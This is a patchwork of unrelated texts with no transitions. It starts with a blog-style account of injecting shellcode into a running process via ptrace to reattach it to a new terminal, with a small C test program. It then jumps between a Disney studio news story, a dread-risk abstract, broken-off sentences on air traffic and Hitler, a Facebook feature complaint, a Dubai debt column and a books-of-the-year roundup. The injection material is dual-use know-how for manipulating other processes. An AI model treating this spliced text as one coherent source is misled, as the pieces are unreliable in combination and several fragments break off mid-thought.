No , this would have to be done with syscalls directly .
This was fairly easy ( albeit a bit awkward ) .
Just :
attach with ptrace ( ) backup the current code and stack pages , as well as the registers replace the content of the code and stack pages with code ( “ shellcode ” ) and data to do my thing .
( the code page can be assumed to be executable , and the stack page can be assumed to be read / writable ) reset EIP to the start of the code page .
resume the process , having it break at the end of my injected shellcode .
restore code and stack pages and registers .
detach from process .
The shellcode was passed a file descriptor via a unix socket and dup2 ( ) ed it over stdin / out / err .
I then tried to get it to change its controlling terminal .
And here ’s where the problems started .
It looks like it ’s impossible to change the current controlling terminal ( CTTY ) to one that already has processes using that terminal as a CTTY ( at least as non -root without changes to the kernel ) .
I therefore have to detach from the terminal with my injector program .
I also have to make sure that no other process is using it ( e.g. bash ) .
But as soon as a terminal has no processes using it as a CTTY the master part of the terminal ( e.g. xterm , getty , … ) will destroy it on its end .
I tested this by running a simple program :
/** just - detach.c * By Thomas Habets < thomas@habets.se >
* 2009-01-22 */ #include < stdio.h > # include < unistd.h > # include < errno.h > # include < string.h > # include < fcntl.h > # include < termios.h > # include < sys/types.h > # include < sys/ioctl.h > # include < sys / stat.h > int main ( int argc , char ** argv ) { int n ; /* detach */ n = ioctl ( 0 , TIOCNOTTY , NULL ) ; printf ( " ioctl(0 , TIOCNOTTY , NULL ) => %d %s
" , n , n ? strerror ( errno ) : " " ) ; printf ( " You will not see this message if running " " \ " exec %s \ " in an xterm .
" , argv [ 0 ] ) ; /* attach */ n = ioctl ( 0 , TIOCSCTTY , 1 ) ; printf ( " ioctl(0 , TIOCSCTTY , 1 ) => %d %s
" , n , n ? strerror ( errno ) : " " ) ; sleep ( 10 ) ; return 0 ; }
Output :
$ ./ just - detach ioctl ( 0 , TIOCNOTTY , NULL ) = > 0
You will not see this message if running " exec ./ just - detach " in an xterm ioctl ( 0 , TIOCSCTTY , 1 ) = > - 1
Operation not permitted
So we ca n’t just detach the terminal and then allow it to be taken and used as a CTTY by the target process .
Nor will we ever be able to put the terminal back the way it was ( retty never detaches the process from the original tty , and therefore does n’t have this problem ) .
Attempt 2 : Create a new pty pair and be a pty- proxy
Ok .
So I have to create a pty pair and handle the master part of the targets new terminal .
No problem , I ’ve created a pty filter before .
… Problem
To set a new CTTY you need a few things just right :
You must be a session leader .
Can be fixed by calling setsid ( ) .
NOT have a CTTY already .
Just do ioctl ( fd , TIOCNOTTY ) to detach from your old CTTY .
The TTY must not already be CTTY for any other process ( unless you are root / have CAP_SYS_ADMIN under Linux ) .
No problem there , the pty was just created for this purpose .
But to run setsid ( 2 ) you must NOT be a process group leader .
And you are :
$ ps - opid , pgid , sid , comm | grep irssi 7940 7940 7938 irssi
To not be the process group leader you have to set it to something else using setpgid ( ) .
The pid you set it to must be in the same session as you .
To run setpgid ( 2 ) you need to be in the same session as the target .
So we must :
find a process in the same session as the target who is willing to make itself process group leader with setpgid ( 0,0 ) … so that we can setpgid ( ) to it with setpgid( 0 , pid ) … so that we can run setsid ( ) to become session leader … so that we can set a new controlling terminal .
If you want to change terminal on your own stuff you can just do a shortcut with fork ( ) , run your stuff in the child and let the parent die , but since we do n’t know what crazy stuff the target may be up to we do n’t want to change the pid of the process .
So we fork off a child that will be the process group leader .
if fork ( ) == 0 : setpgid ( 0 , 0 ) sleep ( infinite ) setpgid ( 0 , child ) setsid ( ) kill ( child , 9 ) waitpid ( child )
It works .
At least on single - process programs .
Tested on irssi and small test programs .
Finishing touches
Send SIGSTOP , SIGCONT to put the process in the background of bash job control .
The user should then type “ disown ” .
Other payloads : Inject “ Hello world ” write ( ) to stdout .
close ( ) fd open ( ) and overwrite existing fd
The working program
Is here .

Feedback
It did n’t take long after putting the project on freshmeat before I got an email from one of the developers of neercs .
It seems they ’ve done something like this too , and perfected it a bit .
They do n’t inject shellcode , but instead hijack an existing syscall instruction in the target program and re-use it to make the target do anything they want .
This is cleaner and makes for easier porting .
They use the same trick to change the CTTY that injcode does .
If you thought President Obama moved quickly , that ’s nothing compared with the first 50 days of the Ross administration .
In less than eight weeks , Rich Ross has swiftly stamped his imprimatur on Walt Disney Studios .
The novice movie chairman and his boss , Walt Disney Co. Chief Executive Bob Iger , want to create a new business model for Hollywood to address the sweeping changes that are roiling the entertainment industry , including slumping DVD sales and the growing role the Internet plays in movie marketing .
Seeking to recast the studio for the digital era , Ross and Iger have set in motion a plan to dramatically challenge entrenched practices , potentially pitting Disney against theater owners , retailers and other business partners .
The gambit , if it works , could be emulated by other studios .
If it backfires , it could undermine what has historically been the creative heart of Disney .

In meetings with producers , filmmakers and agents , Ross attacked the industry custom of spending $ 40 million on a TV advertising blitz two weeks before a film ’s opening , rather than enlisting more targeted campaigns that harness social networks and the broader Web .
And he ’s raised again the touchy subject advanced by Iger that consumers are demanding that movies become available for home viewing sooner after release in theaters than has traditionally been the case .
Hollywood might finally be absorbing the message .
“ Any of us that are sitting around protecting old business models unfortunately are destined to have a hard time succeeding in the coming years , ” said Sam Gores , chairman of talent agency Paradigm .
“ We have to maximize our existing models and , more importantly , build new ones . ”
It ’s too soon to know whether Ross , a seasoned TV executive , can pull off his ambitious plan as well as successfully transition to the movie side of the business -- the track record in Hollywood is mixed .
Ross declined to be interviewed .

In September , Iger stunned the industry when he ousted Disney ’s movie Chairman Dick Cook , a 38 - year veteran who began as a Monorail operator at Disneyland .
By installing Ross , who built the Disney Channel into a global juggernaut , Iger gains more control over a key division he believed had long operated too independently .
Since Ross took over in early October , he has dismissed several top executives and begun restructuring operations .
In the process , some say , the hyperkinetic executive displays flashes of brusqueness and impatience .
The upheaval has created anxiety for employees and even at times disrupted business dealings .
An important meeting with director Tim Burton and producer Joe Roth , who once ran Disney ’s studio , to discuss marketing plans for the upcoming release of their film “ Alice in Wonderland , ” for example , was abruptly canceled pending an executive shake - up , leaving the filmmakers flummoxed .
Since then , Disney watchers have needed a score card to track all the comings and goings .
Last month , Ross flew to New York to fire Daniel Battsek , the head of Disney ’s struggling specialty movie label , who , despite the unit ’s recent poor track record , was caught off guard .
A week later , he pushed out another company veteran , Mark Zoradi , who was president of Walt Disney Motion Pictures Group , in a prelude to an overhaul of the marketing and distribution operations that he oversaw .
Ross next let go marketing President Jim Gallagher and elevated former home video chief Bob Chapek to an expanded role that encompasses all aspects of film distribution from movie theaters to home and digital delivery , breaking with the conventional role of solely booking movies into theaters .

In the coming weeks , Ross plans to hire a new marketing chief -- Disney has retained an executive search firm to find candidates outside and inside the movie business -- who will have an equally broad mandate to handle the promotion of films from multiplexes to living rooms .
Beyond organizational changes , Ross ’ vision for the types of movies that will ultimately define Disney is beginning to emerge .
His main focus will be developing family - friendly movies under the Disney label .
Iger ’s overarching strategy is to amass a stable of recognizable entertainment brands -- Pixar Animation Studios and the pending acquisition of Marvel Entertainment Inc. -- and exploit the films across its TV , theme parks , consumer products and game divisions .
“ It ’s brand over everything else , ” said Roth , referring to movies that come with built - in , pre-sold concepts , such as sequels .
It ’s a strategy , he notes , that although designed to reduce risk is not without a downside .
“ What may get lost in the shuffle are non -branded original ideas that have no pre-awareness . ”
One of the challenges Ross faces is how to navigate the release dates for Disney ’s event movies , including those from high - powered producers Jerry Bruckheimer and Bob Zemeckis .
“ It ’s very difficult because there are only X - number of really key release dates and a lot of filmmakers who make big movies , ” said Bruckheimer , responsible for Disney ’s “ Pirates of the Caribbean ” franchise .

Ross , to a great degree , is doing what every new studio chief does : comb through the list of existing projects to decide those that live and those that die .
Last week , he torpedoed director McG ’s planned $ 150 - million production of “ Captain Nemo : 20,000 Leagues Under the Sea , ” which had been envisioned as a new franchise .
One of the things he ’s told agents is that he ’s looking to make more movies that appeal to women .
In meetings , Ross cited the studio ’s upcoming release “ Old Dogs , ” a comedy starring Robin Williams and John Travolta , as a missed opportunity to further develop the female characters that would widen the movie ’s appeal .
“ He seems to be open to broadening what it means to be a Disney movie , ” said United Talent Agency partner Jeremy Zimmer , “ and to have more diversity and stronger execution of movies . ”
The new direction should n’t come as a surprise :
The studio has suffered two consecutive quarters of operating losses , and Iger this year took the unusual step of publicly criticizing the movie choices .
Trying to cultivate relationships with talent that has close ties to Disney , Ross has been making the rounds in Hollywood .

Shortly after he took over , he went to DreamWorks ’ headquarters to meet with Steven Spielberg and his partner , Stacey Snider , who were enticed into a distribution deal by Cook and were distraught over his ouster .
Snider said that Ross assured them that DreamWorks was an “ important partner ” and “ was not going to let any balls fall . ”
She and Spielberg in turn said to Ross , “ We were sad that Dick was no longer there but that we ’re completely on board with him . ”
Ross also paid a visit to Bruckheimer at his Santa Monica office to see 40 minutes of his action film “ Sorcerer ’s Apprentice , ” and attended a preview of his video game - inspired “ Prince of Persia : The Sands of Time ” -- both big upcoming summer releases for Disney .
“ He ’s off to a fast start , ” said Bruckheimer , referring to his industry networking and studio realignment .
Equally important , he said , is that Ross “ keep up the morale , which is important when you ’ve lost a lot of leaders . ”
A few weeks ago , Ross and Iger visited director Burton and Roth , who showed them a 10 - minute 3 - D clip of “ Alice in Wonderland .
” Ross , who at Disney Channel was known for nurturing talent , apparently hit it off with the eccentric Burton .
“ Rich was very good with Tim , really enthusiastic , ” Roth said
Now , Ross will have to work his magic on the studio ’s biggest star , Johnny Depp , who plays the Mad Hatter in “ Alice in Wonderland ” and Jack Sparrow in the “ Pirates of the Caribbean ” series .
Depp was shaken over the abrupt dismissal of Cook and said at the time that the former studio chief embodied the quality he valued most .
“ You generally do n’t meet people at the studios you trust , ” Depp said .

Abstract
A low - probability , high - damage event in which many people are killed at one point of time is called a dread risk .
Dread risks can cause direct damage and , in addition , indirect damage mediated though the minds of citizens .
I analyze the behavioral reactions of Americans to the terrorist attacks on September 11 , 2001 , and provide evidence for the dread hypothesis : ( i ) Americans reduced their air travel after the attack ; ( ii ) for a period of one year following the attacks , interstate highway travel increased , suggesting that a proportion of those who did not fly instead drove to their destination ; and ( iii ) for the same period , in each month the number of fatal highway crashes exceeded the base line of the previous years .
An estimated 1,500 Americans died on the road in the attempt to avoid the fate of the passengers who were killed in the four fatal flights .
She added that the failure left controllers with " very limited capacity " which meant hardly any flights could be given clearance to enter the airspace or take off towards the area .
" We have put restrictions on aircraft entering oceanic airspace over the North Atlantic . "
Experts say his account of his time as Hitler 's direct link to the SS could discount the claims of revisionists who have tried to claim the German leader knew nothing of the extermination programme .
Right - wing historians have claimed the planning for the murder of six million Jews was carried out by SS chief Heinrich Himmler .

Facebook , it seems , is falling victim to the insensitivity of the algorithm .
The site 's new " reconnect " feature was well - intentioned , I 'm sure : Facebook wanted to reunite friends who have n't connected in some time .
This is a noble aim .
Unfortunately Facebook 's algorithms can't account for some less desirable scenarios : according to Twitter reports , the site is recommending that users reconnect with ex-girlfriends and ex-boyfriends .
It 's recommending they reconnect with their ( current ) husband or wife .
It 's even advising people to reconnect with friends who have died , causing obvious distress .
These are n't isolated cases : there are scores of Twitter reports of these issues .
The new Facebook is wonderful and I 'm thoroughly addicted to the new Live Feed .
But please Facebook , take a second look at your Reconnect feature .
Dubai is not too big to fail .
That seems to be the message of the surprise 6 month debt standstill at Dubai World , the most indebted offshoot of the UAE 's most indebted emirate .
International markets have been jarred by the news , perhaps as much by the timing as the decision itself ( US investors , with markets closed for Thanksgiving , feel more vulnerable than most ) .
But if you have a lot of money resting on Dubai coming through their dramatic boom and bust story intact , this is indeed a major shock .
Put simply : everyone in the markets thought that , in the end , the federal government in Abu Dhabi would stand by all of Dubai 's bad bets .
Apparently , they wo n't .
As with so much in Dubai , we do n't yet know the whole picture .
It 's possible we never will .
It 's even possible that the government will panic at the market reaction to yesterday 's announcement , and magically discover they can service Dubai World 's $ 22bn debt mountain after all .
But right now , the only conclusion to be reached is that Abu Dhabi is willing to let Dubai squirm .
That is not how the script was intended to go .
Dubai obtained $ 10bn from the UAE central bank in February as part of a $ 20 bn sovereign bond programme - in effect , a federal bailout .
When I was in Dubai two weeks ago , there was much speculation about when the next $ 10bn was going to arrive , but Sheikh Mohammed was personally assuring the world that everything was on track .
Just two days ago , they announced they were halfway there , with $ 5 bn raised from strategically situated Abu Dhabi banks .
Even without the remaining $ 5bn , that should have been enough to continue to handle Dubai World 's debts .
The big bill that Dubai World had coming was the repayment of a $ 4bn Islamic bond for Nakheel , the worst afflicted part of the Dubai World empire .
That may still be partly repaid - officials have n't confirmed one way or another .
But the standstill decision leaves investors to ponder what they are not being told - why even $ 15 bn was n't enough to keep the company going , and why , when push came to shove , Abu Dhabi did n't stump up the cash .
As we have learned many times over the past two years , where markets are concerned , too little knowledge is a dangerous thing .
Peter Carey – novelist
Kamila Shamsie 's Burnt Shadows ( Bloomsbury ) has huge ambition and an author equal to the task .
Travelling from Nagasaki to Guantánamo , this very beautiful novel sets out to grasp the nettle of our modern history .
The most utilitarian of us will find it " relevant and contemporary " .
At the same time , it is a work of art , as human as the feel of another 's hand .
Colum McCann once wrote himself inside the skin of Nureyev .
In Zoli he created Romany characters that Romany readers have been pleased to own .
Now , in Let the Great World Spin ( Bloomsbury ) [ winner this week of the National Book Award for fiction ] , he has reinvented the city of New York in all its breathing , fighting , whining , joyous clamour .
Wendy Cope – poet
In January , Areté Books published A Scattering , Christopher Reid 's tribute to his late wife , Lucinda .
His poems about marital love and bereavement are immensely moving .
Reid is a first - rate poet and this is his best book to date .
Later in the year , the same author came up with something quite different .
The Song of Lunch ( CB Editions ) is a witty narrative about a publisher meeting an old flame in an Italian restaurant .
The story is sad , as well as funny , and very enjoyable .
Kazuo Ishiguro – novelist
My reading this year was dominated by Roberto Bolaño's two massive novels , The Savage Detectives and 2666 ( both Picador ) .
The first is the superior , but 2666 , for all its occasional longueurs , is still quite magnificent .
Bolaño links seamlessly South American , US and European traditions ; modernism with gritty realism and the crime thriller .
These are both important works and the advent of Bolaño is a significant moment in the history of modern fiction .
Peter Conrad – Observer critic
My choice is Simon Mawer 's novel The Glass Room ( Little , Brown ) .
Imagine the house of fiction as a clean , shining , transparent box , befouled by some of the nastiest episodes in recent history .
A small saga , beautifully conceived and deeply moving .
Hari Kunzru – novelist
One of the most compelling recent fictional depictions of Manhattan is Richard Price 's Lush Life ( Bloomsbury ) , out this year in paperback , which takes place on the streets of the Lower East Side , a few blocks from where I live .
Price 's low - key crime thriller is also a pointed look at gentrification and social exclusion , more Zola than Raymond Chandler .
His ear for dialogue is extraordinary , as evidenced by his superlative work on The Wire .
Also examining the lives of the dispossessed is The Story of My Assassins by Tarun J Tejpal ( HarperCollins ) , an Indian novel that appears to have been overlooked in the general rush to adore The White Tiger and Slumdog Millionaire .
Less crisp then either but with a much richer understanding of the politics of poverty – the author is a leading investigative journalist – it deserves wider attention .
Dominic
West – actor
Josephine Hart's The Truth About Love ( Virago ) is a devastating account of grief and loss and the truth and lies that bind us to our family and to our country .
Her language is beautiful , her characters rich and funny , and she has the courage to expose the deceit behind nationalism .
It is also painfully personal and , like all great works of art , one is aware how much it cost her to write it .
Jackie Kay – writer
A very strong year for poetry .
I was particularly moved by Fred D'Aguiar 's Continental Shelf ( Carcanet ) .
The heart of the book is a series of elegiac sonnets about the Virginia Tech massacre .
D'Aguiar teaches there ; his poems evoke the process of trying to work out what life means in the face of such senseless murder .
Rain by Don Paterson ( Faber ) was another favourite of mine .
Paterson is simply one of the best living poets in the UK .
Kachi A Ozumba's The Shadow of a Smile ( Alma Books ) is a brilliantly funny and gripping novel that examines the corruption and hypocrisy within the Nigerian justice system .
Philip French – Observer film critic
The most valuable movie book of 2009 is Joseph P Kennedy 's Hollywood Years by Cari Beauchamp ( Faber ) , a meticulously researched account of how the Bostonian scoundrel established the family fortune in the movie business and remained in influential contact with Tinseltown until his dying day .
Antony Beevor 's D - Day ( Allen Lane ) is a brilliantly organised , eye - opening epic about the world 's greatest military campaign .
With his second brick - sized volume , Family Britain 1951 - 57 ( Bloomsbury ) , David Kynaston magnificently continues his sociocultural history of postwar Britain , bringing my formative years into sharper focus on every page .
Shami Chakrabarti – civil rights campaigner
Burnt Shadows by Kamila Shamsie ( Bloomsbury ) has reconfirmed my long - held view that great fiction is capable of inspiring progressive insight and action well beyond the reach of political polemic , philosophy , documentary or even law .
Shamsie achieves the near impossibility of a truly intimate epic tale .
The multiple identities of various members of her complex family of characters are explored across continents and decades .
Cataclysmic world events from the atomic bomb at Nagasaki to the Twin Towers atrocity are treated with a subtlety and humanity often lacking from political writing .
I challenge anyone to put this book down lightly or not to identify with at least one of its many flawed and yet irresistibly human characters .
Kirsty Wark – broadcaster
Rarely do I read a new novel and immediately resolve to read it again , but Colm Tóibín 's Brooklyn ( Viking ) , the tender and spare story of a young Irish girl 's emigration to the Brooklyn of the 1950s , merits revisiting .
Tóibín has infused his group of female characters with humour and sadness , and his evocation of their precarious journey to a new life seems to me pitch - perfect .
Nigel Slater 's Tender Volume 1 ( HarperCollins ) – hurrah , there 's more to come – is to be savoured as much as his baked onions , porcini and cream .
David Cameron – politician
Every once in a while , political diaries emerge that are so irreverent and insightful that they are destined to be handed out as leaving presents in offices across Whitehall for years to come .
Chris Mullin's A View From the Foothills ( Profile ) is one such book .
Its humour and self - deprecation more than make up for the nagging feeling it leaves behind that The Thick of It may not always be all that far from the truth .
All politicians need to read honest accounts of war – at no time more than now – and Patrick Hennessey 's The Junior Officers ' Reading Club ( Allen Lane ) is one of the very best .
There is even some humour in it and plenty of insight .
Its engrossing narratives on 21st - century warfare and its effects are guaranteed to remain in the mind long after the book is finished .
Mary Warnock – philosopher
The book that has interested me most this year has the rebarbative title Psychiatry as Cognitive Neuroscience : Philosophical Perspectives , edited by Matthew R Broome and Lisa Bortolotti ( Oxford University Press ) .
It is a collection of very varied essays on subjects such as the nature of mental illness , whether psychiatry is a science , and why so - called personality disorder can't be treated , all matters of great interest in themselves , but also of relevance to criminal law and sentencing policy .
Despite its title , it is a gripping read .
Not so gripping , however , as Robert Harris 's Lustrum ( Hutchinson ) .
Ever since Imperium I 've been longing for the next instalment and it does n't disappoint .
It 's a marvellous novel .
Colm Tóibin – novelist
Chloe Hooper 's The Tall Man ( Jonathan Cape ) is the chilling story of the death in custody of an Aboriginal prisoner in Australia .
It is told with a novelist 's eye for detail and flair for narrative , but there is also a passionate engagement with the story in all its complexity and a sort of rage that make the book utterly compelling .
David Vann 's Legend of a Suicide ( Viking ) is equally gripping .
For the imagery alone and for the sentences , the book would be a treasure , but the story it tells – the story of the suicide of the author 's father – has an immediacy and sharpness made all the more special by the tone of distance in the narrative and the beauty of the writing .
In poetry , Don Paterson 's Rain ( Faber ) displays one of the greatest poets now writing anywhere at his most wise and wry and eloquent .
David Kynaston – historian
Arguably the finest British diarist since Virginia Woolf has now , in James Lees - Milne , found his fitting memorial .
Michael Bloch 's biography ( John Murray ) is admirably judged : warm , but not hagiographical ; sufficiently candid about Lees - Milne 's many loves ( including , in an often masochistic relationship , his ghastly wife , Alvilde ) ; and acutely revealing about the demons that drove him .
Lees - Milne may not have been quite a Pepys , and Bloch is not a Claire Tomalin , but subject and author are here perfectly matched .
Sam Mendes – director
I was touched by Michael Chabon 's Manhood for Amateurs ( Harper US ) , an honest and funny account of the struggles of being a father ; gripped by Andrew Ross Sorkin 's Too Big to Fail ( Allen Lane ) , a superbly researched and sobering take on the events surrounding the meltdown on Wall Street ; and mesmerised by Colum McCann 's Let the Great World Spin ( Bloomsbury ) , a wonderful book that puts its author right at the front rank of contemporary novelists .
Michael Palin – broadcaster
Sara Wheeler 's The Magnetic North ( Jonathan Cape ) provides acute insights into life north of the Arctic Circle .
Abundant energy resources and the alarmingly swift effects of global warming make this a fascinating and relevant journey ; she uses human stories to inform and enlighten us .
Roy Hattersley – politician and historian
Team of Rivals by Doris Kearns Goodwin ( Penguin ) is a biography of Abraham Lincoln , a history of the American Civil War , vignettes of half - a- dozen 19th - century American politicians and a textbook on good government .
It is written in such a compelling style that , despite the complexities of the characters and the subtlety of the arguments , the reader zips through .
The Spirit Level by Richard Wilkinson and Kate Pickett ( Allen Lane ) confirms , scientifically , what social democrats have always hoped was true : the better - off have much to gain from redistribution of wealth , since the more equal societies are spared much of the social evil that afflicts modern society .
The confirmation that morality and expediency do coincide comes as a great relief in a disturbing year .
Geoff Dyer – novelist
The Music Room ( Picador ) is William Fiennes 's memoir of growing up in a rambling old castle .
This unusual home and upbringing are evoked with great beauty and poignancy ( his epileptic brother , Richard , is an increasingly vulnerable and volatile presence ) , in ravishing prose , but the book has another , strangely hypnotic effect , enfolding the reader in memories of a child 's view of the world that seems universal .
Well , maybe not if you grew up in the drug - ruined ghettos of west Baltimore .
The Corner ( Canongate ) by David Simon and Ed Burns came out in the US in 1997 , but had to wait until we all went gaga about The Wire to be published here .
It 's an unforgettable , devastating account of neighbourhoods and generations in the process of being laid waste .
Geordie Greig – journalist
The greatest living master of the short story , William Trevor , has written a jewel of a novel with Love and Summer ( Viking ) .
It is a story set in 1950s Ireland where the small - town characters are torn by love , disappointment , revenge and compassion .
At 81 , this brilliant Irish author still demonstrates his ability to show the subtler shades of unrequited passion .
Ayaan Hirsi
Ali – writer
Christopher Caldwell 's Reflections on the Revolution in Europe ( Allen Lane ) zooms in on the challenges of Muslim migration to Europe , telling the story with an outsider 's eye .
It 's a disturbing read but a necessary wake - up call .
Curtis Sittenfeld – novelist
I really enjoyed the essay collection Bad Mother by Ayelet Waldman ( Doubleday ) .
A friend sent me the book after I had my first baby last spring , and I found Waldman – who graduated from Harvard Law School and worked as a public defender before having four children – to be frank , insightful , and very funny .
Waldman 's a somewhat controversial writer in the US , known for being outspoken and also for being married to the novelist Michael Chabon , and as I read I did sometimes think , wow , you 're really revealing that about yourself and your family ?
But her honesty kept me turning pages , and after each essay , I felt like I 'd just had a conversation with a smart and outrageous friend .
Jeremy Paxman – broadcaster
There are three books that I have particularly enjoyed recently : I was gripped by Simon Mawer 's The Glass Room ( Little , Brown ) , chortled through Sue Townsend 's Adrian Mole : The Prostrate Years ( Michael Joseph ) and learned a lot from Allan Mallinson 's The Making of the British Army ( Bantam ) .
Malcolm Gladwell – writer
I cannot remember enjoying a book as much as Iain Pears 's Stone 's Fall ( Jonathan Cape ) .
It 's more adventurous even than Pears 's earlier classic , An Instance of the Fingerpost .
We should stop calling Pears a genre writer of thrillers and , as we have done for John le Carré , simply call him a great novelist .
Eric Hobsbawm – historian
In its original German version , I found Hans Magnus Enzensberger 's The Silences of Hammerstein a virtuoso combination of research , reportage and imagination , as good an introduction as any to the Weimar Republic , impossible to put down .
This is the story of Kurt von Hammerstein , the last ( and anti-Nazi ) general commanding the German army before Hitler came to power , and his children , divided between communists , ex-communists and 1944 military conspirators .
It has now been beautifully published in English by Seagull Books in , of all places , Calcutta .
Shlomo Sand's The Invention of the Jewish People ( Verso ) is both a welcome and , in the case of Israel , much needed exercise in the dismantling of nationalist historical myth and a plea for an Israel that belongs equally to all its inhabitants .
Perhaps books combining passion and erudition do n't change political situations , but if they did , this one would count as a landmark .
Philip Hensher – novelist
Two blockbusters , made out of writing of brevity and concision , were the highlights of my reading year .
Blake Bailey 's exemplary life of John Cheever ( Picador ) was full of its subject 's inimitable voice , ruthless , hilarious , cruel and drink - sodden .
In some ways , the story is a terrifying one – Cheever descended to psychic depths few of us will even witness – but it should always be remembered that this greatest of American novelists was , above all , extremely funny .
The only thing wrong with the new , two - volume Collected Stories of William Trevor was the repulsively cheap paper Penguin printed it on – the ink smeared underneath my fingers , which is no way to treat the greatest living exponent of the short story in English .
The Booker panel might , too , have found a space for Trevor 's miraculous Love and Summer ( Viking ) , a late - period summation of thought and expression if ever I saw one .
But the best novel of the year was Lorrie Moore 's A Gate at the Stairs ( Faber ) , both traumatic and dazzlingly witty ; scenes you wish you could forget , sentences you were grateful for .
Fergus Henderson – chef
My nomination is Fernand Point 's Ma Gastronomie ( Duckworth ) .
It 's a collection of the great man 's ( he truly was a great man ) recipes , thoughts , menus .
Point was the chef of La Pyramide restaurant near Lyon , a legend and mentor to a generation of chefs .
He started his day with the barber coming to shave him and two magnums of champagne .
Not bad .
Tim Adams – Observer writer
As a reminder of why great journalism has not much to do with Twitter updates and round - the - clock opinion , I 've carried a couple of volumes with me : Michael Frayn 's Travels With a Typewriter ( Faber ) and Ian Jack 's The Country Formerly Known as Great Britain ( Jonathan Cape ) .
Both collections are testament to a lifetime of intimate looking and to the hard labour of getting the world out there on to the page .
The patience and intelligence of their storytelling is a good antidote to all that buzzes .
Daljit Nagra – poet
At this time of year , Amartya Sen 's The Idea of Justice ( Allen Lane ) is a sober analysis of how we arrive at notions of justice .
Sen uses examples from eastern and western traditions to help elucidate his abstract arguments .
Sobriety is also maintained through two remarkable poetry collections .
Both Christopher Reid's A Scattering ( Areté Books ) and Don Paterson 's Rain ( Faber ) are haunted by the loss of loved ones .
While Reid 's heartbreakingly spare narrative about the death of his wife is moving for its simplicity of expression , Paterson 's collection has an Augustan frankness , an Elizabethan elegance and a postmodern playfulness .
Melvyn Bragg – novelist and broadcaster
Diarmaid MacCulloch 's monumental A History of Christianity ( Allen Lane ) is essential reading for those enthralled by Christianity and for those enraged by it , while those who protest indifference may be ambushed by surprise at its force in world culture over the millenniums .
Francis
Wheen is a superb , idiosyncratic chronicler of our times and Strange Days Indeed ( Fourth Estate ) is a glittering , pinpointed view on the 1970s .
Wheen has a scholar 's mind , the energy of a supercharged magpie and a lofty wit that never sours .
Nicholas Hytner – director
This year , I 've read some wonderfully enjoyable novels .
The fastest page - turner , dry - mouthed and sweaty - palmed , was William Boyd 's Ordinary Thunderstorms ( Bloomsbury ) .
Hilary Mantel 's Wolf Hall ( Fourth Estate ) was every bit as good as they said it was .
And Colm Tóibín 's Brooklyn ( Viking ) moved me more than any other book this year : a miraculously empathetic journey across the Atlantic and back again with a young Irish woman , ordinarily lonely , ordinarily in love , ordinarily fickle – but her every thought and action quite extraordinarily truthful .
A short masterpiece .
Joan Bakewell – broadcaster and novelist
A View From the Foothills by Chris Mullin ( Profile ) is a political diary that stands with the best , alongside Alan Clark and Chips Channon .
Mullin never made it to the political heights , but his experience of being a junior minister under Tony Blair – referred to throughout as " the Man " – is full of cunning humour .
We know from his earlier Austerity Britain how thorough David Kynaston is , but I was apprehensive that the 1950s , which he tackles in Family Britain 1951 - 57 ( Bloomsbury ) , would simply be too dull .
Far from it .
Kynaston has dredged reminiscences , diaries , political archives , newspapers and magazines for every scrap of interest and detail .
Bidisha – critic
I 've been getting into some dark , thoughtful adult mystery fiction this year .
One of my favourite books has been The Owl Killers by Karen Maitland ( Michael Joseph ) , which is about a superstitious , uptight , pagan village of mad paranoiacs tormented by the arrival of a community of women .
Think Wicker Man meets
The Handmaid 's Tale with a whiff of Deliverance .
I was also extremely impressed by The Forest of Hands and Teeth , the debut novel by Carrie Ryan ( Gollancz ) .
It 's a post - apocalyptic political zombie allegory with a gothic flavour .
Vivienne Westwood – fashion designer
My recommended read is The Vanishing Face of Gaia by James Lovelock ( Allen Lane ) .
At somewhere between 400 and 500 parts per million ( ppm ) of CO ² in the atmosphere , the Earth will settle down to a new equilibrium of 5C hotter than now .
Our luscious , comfortable world will be gone .
What is left will support about a fifth of the present population .
We must plan .

In the Graveyard of Empires ( Norton ) is a devastating critique of the mismanagement of the Afghan war by the US and Britain , whose argument is all the stronger because his perspective is not from the left .
The book reveals that things are worse than we suspect and even an old cynic like myself was shocked at some of the revelations .
In The Spirit Level ( Allen Lane ) , Richard Wilkinson and Kate Pickett offer proof that most of the ills of our " broken society " arise out of the growing inequality of the past 30 years .
If Tony Blair had known this , his could have been one of the three great reforming governments of the last century to stand alongside 1906 and 1945 .
And Mandelson would have known why he should n't have been so relaxed about the filthy rich .

Wells Tower 's superb collection of short stories , Everything Ravaged , Everything Burned ( Granta ) , is dark and funny , and in Tower 's case , the former quality does not negate the latter .
When , in one of the stories , a woman finds out that her husband is having an affair because the footprint on the car windscreen does not match her own , you know you 're reading somebody who does n't come along very often .
My favourite work of non-fiction this year was written by the Observer 's art critic – I 'm sorry , but there we are .
Laura Cumming 's brilliant book about self - portraits , A Face to the World ( HarperPress ) , positively fizzes with ideas ; just about every single paragraph contains a fresh observation , not just about art but about human nature .
The author has got me running around galleries I have n't been to in years .
Colum McCann – novelist
Zeitoun by Dave Eggers ( McSweeney 's Books ; published here in February by Hamish Hamilton ) is an examination of America in the time of Katrina , an indictment of bureaucracy , a testimony to the possibility of goodness , a level - headed look at Muslim America , a heartbreaking rap sheet for the Bush years , all this and more ...
I was completely enthralled by this book from one of the most socially engaged and provocative writers of our times .
The Infinities ( Picador ) is John Banville 's best book , I think .
The prose is honed , as always , and every word matters , but the book breathes with humour and shines with a lovely discursive wink .
It 's also the sort of novel that you nod along to , then it swerves and you do n't quite know where you are , but you experience the thrill of being suitably lost .

This year 's Booker winner , Hilary Mantel 's Wolf Hall ( Fourth Estate ) , caught my eye early on when I interviewed her about it on Open Book on Radio 4 .
Having spotted its potential , I wish I 'd followed through with a call to William Hill !
Two novels by Antipodean authors also figured highly this year : Richard Flanagan 's Wanting ( Atlantic Books ) , a brutal evocation of the fate of a young Aboriginal girl , adopted by the governor of Van Diemen 's Land and his wife , and later discarded ; and David Malouf 's Ransom ( Chatto ) , a wonderful retelling of the encounter between Achilles and the Trojan King Priam in prose that 's so good you want to eat it .
Andrew Rawnsley – Observer columnist
Chris Mullin produced an account , both highly hilarious and deeply depressing , of the futility of much ministerial life in his diaries , A View From the Foothills ( Profile ) .
Politics on a much grander canvas was brilliantly brought to life by Doris Kearns Goodwin in her superb Team of Rivals ( Penguin ) about the presidency of Abraham Lincoln .
A timely and penetrating audit of authoritarianism around the world came from John Kampfner 's Freedom for Sale ( Simon & Schuster ) .
While highly critical of the trajectory of the present government , he does not level the lazy charge made by some that we already live in " a police state " .
David Vann – novelist
Elegant and controlled , Colm Tóibín 's Brooklyn ( Viking ) , the tale of Eilis , a young woman who emigrates from Ireland to America in the 1950s , is the book that broke my heart this year .
Eilis is so close and intimate .
